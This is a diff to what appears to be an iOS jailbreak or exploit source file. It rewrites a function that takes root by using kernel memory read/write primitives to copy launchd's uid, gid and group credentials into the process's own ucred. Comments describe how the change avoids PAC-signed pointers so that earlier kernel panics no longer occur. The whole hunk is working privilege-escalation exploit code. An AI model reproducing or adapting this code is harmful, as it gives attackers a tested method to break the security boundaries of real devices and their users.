@@ -271,39 +271,87 @@ static uint64_t sbx_ucredbyproc_nosandbox(uint64_t proc) {
 
 // UI log callback — set from ADSRootViewController before calling elevate
 void (^sbx_ui_log)(NSString *) = NULL;
-#define ELOG(fmt, ...) do {     NSString *_s = [NSString stringWithFormat:@"[elv] " fmt, ##__VA_ARGS__];     NSLog(@"%@", _s);     if (sbx_ui_log) dispatch_async(dispatch_get_main_queue(), ^{ sbx_ui_log(_s); }); } while(0)
+#define ELOG(fmt, ...) do {     NSString *_s = [NSString stringWithFormat:@"[elv] " fmt, ##__VA_ARGS__];     NSLog(@"%@", _s);     if (sbx_ui_log) { void(^_cb)(NSString*) = sbx_ui_log; dispatch_async(dispatch_get_main_queue(), ^{ _cb(_s); }); } } while(0)
 
 int sandbox_elevate_to_root(uint64_t self_proc) {
-    uint64_t launchd = proc_find(1);
-    ELOG(@"launchd proc_find(1): 0x%llx", launchd);
-    if (!launchd || launchd == (uint64_t)-1) {
-        ELOG(@"could not find launchd");
-        return -1;
-    }
-
-    uint64_t launchducred = sbx_ucredbyproc_nosandbox(launchd);
-    ELOG(@"launchd ucred: 0x%llx", launchducred);
-    if (!launchducred) {
-        ELOG(@"failed to get ucred from launchd");
-        return -1;
-    }
+    // Strategy: copy uid/gid fields from launchd's posix_cred into our own ucred.
+    //
+    // DO NOT swap the ucred pointer in proc/proc_ro — those pointers are PAC-signed
+    // with the DA key. Writing a stripped/unauth'd pointer triggers a PAC failure
+    // → kernel panic (confirmed by panic log: "PAC failure from kernel with DA key
+    // while authing x16"). Instead, patch the posix_cred fields inside our own ucred
+    // (which we already hold a valid reference to).
 
     if (!self_proc) {
         ELOG(@"self_proc is NULL");
         return -1;
     }
 
-    uint64_t ourucredraw = early_kread64(self_proc + 0x10);
-    uint64_t ourucred = S(ourucredraw);
-    ELOG(@"our ucred raw=0x%llx stripped=0x%llx", ourucredraw, ourucred);
+    // Find our ucred via dynamic scan (handles proc_ro+0x20 vs +0x28 across iOS versions)
+    uint64_t our_ucred = 0;
+    uint32_t ucred_slot_off = 0;
+    if (sbx_find_ucred_slot(self_proc, &our_ucred, &ucred_slot_off) != 0) {
+        // Fallback: use offsets_init values directly
+        uint64_t our_proc_ro = S(early_kread64(self_proc + OFF_PROC_PROC_RO));
+        if (K(our_proc_ro)) {
+            our_ucred = S(early_kread64(our_proc_ro + OFF_PROC_RO_UCRED));
+        }
+    }
+    ELOG(@"our ucred: 0x%llx", our_ucred);
+    if (!K(our_ucred)) {
+        ELOG(@"failed to find our ucred");
+        return -1;
+    }
 
-    early_kwrite64(self_proc + 0x10, launchducred);
-    __asm__ volatile("dsb sy" ::: "memory");
+    // Find launchd (pid 1) — proc_find(1) is safe (stops at first hit)
+    uint64_t launchd = proc_find(1);
+    ELOG(@"launchd proc: 0x%llx", launchd);
+    if (!launchd || launchd == (uint64_t)-1) {
+        ELOG(@"could not find launchd");
+        return -1;
+    }
+
+    // Get launchd's ucred (no sandbox, so use nosandbox variant)
+    uint64_t launchd_ucred = sbx_ucredbyproc_nosandbox(launchd);
+    ELOG(@"launchd ucred: 0x%llx", launchd_ucred);
+    if (!K(launchd_ucred)) {
+        ELOG(@"failed to get launchd ucred");
+        return -1;
+    }
+
+    // posix_cred is embedded in ucred at OFF_UCRED_CR_POSIX (+0x18).
+    // Read launchd's posix_cred fields and write them into ours.
+    // This avoids touching any PAC-protected pointers.
+    uint64_t ld_posix  = launchd_ucred + OFF_UCRED_CR_POSIX;
+    uint64_t our_posix = our_ucred     + OFF_UCRED_CR_POSIX;
+
+    // uid, ruid, svuid (each uint32_t at +0x00, +0x04, +0x08)
+    uint32_t ld_uid   = kread32(ld_posix + OFF_POSIX_CR_UID);
+    uint32_t ld_ruid  = kread32(ld_posix + OFF_POSIX_CR_RUID);
+    uint32_t ld_svuid = kread32(ld_posix + OFF_POSIX_CR_SVUID);
+    ELOG(@"launchd uid=%u ruid=%u svuid=%u", ld_uid, ld_ruid, ld_svuid);
+
+    kwrite32(our_posix + OFF_POSIX_CR_UID,   ld_uid);
+    kwrite32(our_posix + OFF_POSIX_CR_RUID,  ld_ruid);
+    kwrite32(our_posix + OFF_POSIX_CR_SVUID, ld_svuid);
+
+    // rgid, svgid (at +0x50, +0x54)
+    uint32_t ld_rgid  = kread32(ld_posix + OFF_POSIX_CR_RGID);
+    uint32_t ld_svgid = kread32(ld_posix + OFF_POSIX_CR_SVGID);
+    kwrite32(our_posix + OFF_POSIX_CR_RGID,  ld_rgid);
+    kwrite32(our_posix + OFF_POSIX_CR_SVGID, ld_svgid);
+
+    // Also copy groups[0] so gid=0
+    uint32_t ld_gid0 = kread32(ld_posix + OFF_POSIX_CR_GROUPS_0);
+    kwrite32(our_posix + OFF_POSIX_CR_GROUPS_0, ld_gid0);
+
+    // Memory + TLB barrier before calling getuid()
+    __asm__ volatile("dsb sy; isb" ::: "memory");
 
     int uid = getuid();
-    ELOG(@"uid after write: %d", uid);
+    ELOG(@"uid after posix_cred patch: %d", uid);
     if (uid == 0) {
-        ELOG(@"SUCCESS");
+        ELOG(@"SUCCESS - root achieved via posix_cred patch");
         return 0;
     }
 
